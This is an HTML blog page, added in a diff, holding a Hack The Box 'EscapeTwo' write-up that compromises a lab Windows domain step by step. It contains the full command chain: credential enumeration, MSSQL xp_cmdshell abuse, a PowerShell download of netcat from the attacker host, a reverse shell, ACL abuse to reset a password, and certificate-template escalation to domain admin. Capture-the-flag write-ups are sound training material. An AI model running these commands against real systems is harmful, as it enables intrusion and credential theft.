@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <title>Matthew Castro - Blog</title>
+    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
+    <!-- Font Awesome icons (free version)-->
+    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+    <!-- Google fonts-->
+    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
+        type="text/css" />
+    <link
+        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
+        rel="stylesheet" type="text/css" />
+    <!-- Core theme CSS (includes Bootstrap)-->
+    <link href="../../css/styles.css" rel="stylesheet" />
+    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
+    <link rel="preload" as="image" href="/assets/img/posts.jpg">
+</head>
+
+<body>
+    <!-- Navigation-->
+    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+        <div class="container px-4 px-lg-5">
+            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
+                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                Menu
+                <i class="fas fa-bars"></i>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarResponsive">
+                <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <!-- Page Header-->
+    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
+        <div class="container position-relative px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <div class="post-heading">
+                        <h2>EscapeTwo - Hack the Box Write-up</h2>
+                        <span class="meta">
+                            Posted on March 1st, 2026
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Post Content-->
+    <article class="mb-4">
+        <div class="container px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <p></p>
+                        We start by running Nmap against the host.
+                    <p></p>
+                        <span class="grey-line">sudo nmap -sC -sV -p- -T 5 10.129.232.128</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/1.png" alt="..." />
+                    <p></p>
+                         We then run bloodhound-python using the provided credentials to obtain information on all objects on the domain.
+                    <p></p>
+                         <span class="grey-line">bloodhound-python --zip -c All -d sequel.htb -u rose -p KxEPkKe6R8su -dc dc01.sequel.htb -ns 10.129.232.128</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/2.png" alt="..." />
+                    <p></p>
+                         We also enumerate shares on the host using crackmapexec.
+                    <p></p>
+                        <span class="grey-line">crackmapexec smb sequel.htb -u rose -p KxEPkKe6R8su --shares</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/3.png" alt="..." />
+                    <p></p>
+                         <span class="grey-line">smbclient '\\sequel.htb\Accounting Department' -U 'rose'</span>
+                    <p></p>
+                         <span class="grey-line">dir</span>
+                    <p></p>
+                         <span class="grey-line">get accounts.xlsx</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/4.png" alt="..." />
+                    <p></p>
+                    The files cannot be opened in Excel, but if we open them with Kali's archive manager, we are able to obtain a password from the file "sharedStrings.xml".
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/5.png" alt="..." />
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/6.png" alt="..." />
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/7.png" alt="..." />
+                    <p></p>
+                    We use this password to establish a connection to the MSSQL service as the SA using Impacket.
+                    <p></p>
+                         <span class="grey-line">impacket-mssqlclient -port 1433 'sequel/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/8.png" alt="..." />
+                    <p></p>
+                    There is a good chance that we will be able to use the xp_cmdshell stored procedure as we have control over the SQL administrative user. We attempt to enable the procedure.
+                    <p></p>
+                         <span class="grey-line">enable_xp_cmdshell</span>
+                    <p></p>
+                         <span class="grey-line">xp_cmdshell whoami</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/9.png" alt="..." />
+                    <p></p>
+                        We see that our host commands were executed successfully. We now run commands to create a temp folder on the victim machine, transfer the netcat binary and execute our payload to obtain a reverse shell.
+                    <p></p>
+                         <span class="grey-line">xp_cmdshell "mkdir C:\temp"</span>
+                    <p></p>
+                         <span class="grey-line">xp_cmdshell "powershell -c iwr -uri http://10.10.14.132/nc.exe -O C:/temp/nc.exe"</span>
+                    <p></p>
+                         <span class="grey-line">xp_cmdshell "C:\temp\nc.exe 10.10.14.132 1234 -e cmd.exe"</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/10.png" alt="..." />
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/11.png" alt="..." />
+                    <p></p>
+                    Using our shell, we find additional credentials in one of the MSSQL configuration files.
+                    <p></p>
+                         <span class="grey-line">type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/12.png" alt="..." />
+                    <p></p>
+                    We test the credentials against all users and obtain a match with user ryan.
+                    <p></p>
+                         <span class="grey-line">crackmapexec smb sequel.htb -u users -p WqSZAF6CysDQbGb3 </span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/13.png" alt="..." />
+                    <p></p>
+                    If we examine ryan's permissions with bloodhound, we notice that he has the WriteOwner permission on user ca_svc. We use this to make ryan the object owner of the user and grant ourselves GenericAll permissions, which allows us to change the user's password.
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/14.png" alt="..." />
+                    <p></p>
+                         <span class="grey-line">impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/15.png" alt="..." />
+                    <p></p>
+                         <span class="grey-line">impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/16.png" alt="..." />
+                    <p></p>
+                         <span class="grey-line">net rpc password "ca_svc" "Password123" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "10.129.2.100"</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/17.png" alt="..." />
+                    <p></p>
+                    Because this user is called ca_svc (ca for certificate authority), we assume he will have some sort of privileges relating to certificates. We run certipy against the host to check for any misconfigured certificate templates that the user might have rights over.
+                    <p></p>
+                         <span class="grey-line">certipy-ad find -u ca_svc -p Password123 -dc-ip 10.129.2.100 -target sequel.htb -enabled -vulnerable -stdout</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/18.png" alt="..." />
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/19.png" alt="..." />
+                    <p></p>
+                    We find an ESC4 vulnerability for the template "DunderMifflinAuthentication". We see that the Cert Publishers group, which the user ca_svc is part of, has modification rights over the template. This will allow us to modify certain attributes of the template to artificially create an ESC1 vulnerability.
+                    <p></p>
+                         <span class="grey-line">certipy-ad template -u "ca_svc@sequel.htb" -p "Password123" -dc-ip "10.129.2.100" -template "DunderMifflinAuthentication" -write-default-configuration</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/20.png" alt="..." />
+                    <p></p>
+                         <span class="grey-line">certipy-ad req -u 'ca_svc@sequel.htb' -p 'Password123' -dc-ip 10.129.2.100 -target 'sequel.htb' -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn 'administrator@sequel.htb' -sid 'S-1-5-21-548670397-972687484-3496335370-500'</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/21.png" alt="..." />
+                    <p></p>
+                    Note: This box resets the password for ca_svc every couple of minutes. If the certificate template exploitation is not working, you must grant user ryan ownership of ca_svc, give him GenericAll privileges and change user ca_svc's password all over again.
+                    <p></p>
+                    We now have a valid certificate for the domain administrator. We extract its hash and obtain a remote session on the domain controller as the DA.
+                    <p></p>
+                         <span class="grey-line">certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.2.100 </span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/22.png" alt="..." />
+                    <p></p>
+                         <span class="grey-line">evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i sequel.htb</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escapetwo/22.png" alt="..." />
+                    <p></p>
+                </div>
+            </div>
+        </div>
+    </article>
+    <!-- Bootstrap core JS-->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Core theme JS-->
+    <script src="js/scripts.js"></script>
+</body>
+
+</html>
